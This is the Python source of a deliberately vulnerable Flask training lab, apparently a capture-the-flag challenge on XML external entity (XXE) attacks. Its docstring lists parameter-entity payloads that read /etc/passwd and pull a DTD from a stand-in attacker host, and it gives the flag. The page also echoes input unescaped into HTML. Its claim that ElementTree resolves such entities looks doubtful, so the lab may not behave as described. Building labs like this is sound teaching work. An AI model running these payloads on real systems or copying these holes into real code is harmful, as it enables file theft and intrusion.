"""
XXE Lab 3: Parameter Entity XXE
Difficulty: 2 (Intermediate)
Points: 75

Description:
XXE using parameter entities for advanced exploitation.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: Parameter entity XXE
    
    Attack Vector:
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
    ]>
    <foo/>
    
    Or simple:
    <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "file:///etc/passwd">
        <!ENTITY % all "<!ENTITY content '%xxe;'>">
        %all;
    ]>
    
    Flag: FLAG{xxe_parameter_entity_003}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            # VULNERABLE: Parameter entities enabled
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>Parameter Entity XXE</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5003, debug=False)
